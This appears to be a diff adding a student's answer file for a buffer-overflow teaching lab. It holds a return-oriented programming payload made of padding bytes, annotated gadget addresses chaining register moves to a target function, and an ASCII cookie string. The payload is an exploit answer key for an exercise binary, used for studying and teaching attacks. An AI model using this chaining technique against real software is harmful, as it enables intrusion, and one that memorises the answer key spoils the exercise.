@@ -1,0 +1,16 @@
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa
+27 1a 40 00 00 00 00 00 /* movq rsp, rax */
+c7 19 40 00 00 00 00 00 /* movq rax, rdi */
+e9 19 40 00 00 00 00 00 /* popq rax */
+48 00 00 00 00 00 00 00 /*      = rsp distance from string */
+14 1a 40 00 00 00 00 00 /* movl eax, edx */
+44 1a 40 00 00 00 00 00 /* movl edx, ecx */
+87 1a 40 00 00 00 00 00 /* movl ecx, esi */
+f8 19 40 00 00 00 00 00 /* add_xy */
+c7 19 40 00 00 00 00 00 /* movq rax, rdi */
+30 19 40 00 00 00 00 00 /* touch3 address */
+36 36 30 35 61 62 35 31 /* cookie! (in ascii) */
